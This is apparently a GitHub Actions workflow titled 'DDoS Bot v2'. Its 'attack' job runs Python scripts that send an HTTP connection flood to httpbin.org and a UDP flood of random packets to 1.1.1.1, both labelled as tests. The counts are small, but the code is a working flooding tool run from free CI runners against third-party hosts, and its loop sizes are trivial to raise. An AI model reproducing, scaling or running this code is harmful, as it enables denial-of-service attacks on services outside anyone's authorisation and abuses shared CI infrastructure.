name: "DDoS Bot v2"
on: workflow_dispatch
jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
      - name: Test Connection
        run: python3 -c "print('Testing 1.1.1.1:80'); import socket; s=socket.socket(); s.settimeout(2); s.connect(('1.1.1.1',80)); print('✅ Connected'); s.close()"
      - name: HTTP Flood Test
        run: |
          python3 << "EOF"
import socket
import threading
import time

print("🚀 Starting HTTP Flood Test")
target = "httpbin.org"
port = 80

count = 0

def attack():
    global count
    for i in range(10):
        try:
            s = socket.socket()
            s.settimeout(1)
            s.connect((target, port))
            s.send(b'GET / HTTP/1.1\\r\\n\\r\\n')
            s.close()
            count += 1
        except:
            pass

threads = []
for i in range(5):
    t = threading.Thread(target=attack)
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print(f"✅ HTTP Test Complete: {count} requests")
EOF
      - name: UDP Flood Test
        run: |
          python3 << "EOF"
import socket
import os
import time

print("📨 Starting UDP Flood Test")
target = "1.1.1.1"
port = 80

count = 0
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

for i in range(20):
    try:
        sock.sendto(os.urandom(1024), (target, port))
        count += 1
    except:
        pass

sock.close()
print(f"✅ UDP Test Complete: {count} packets")
EOF
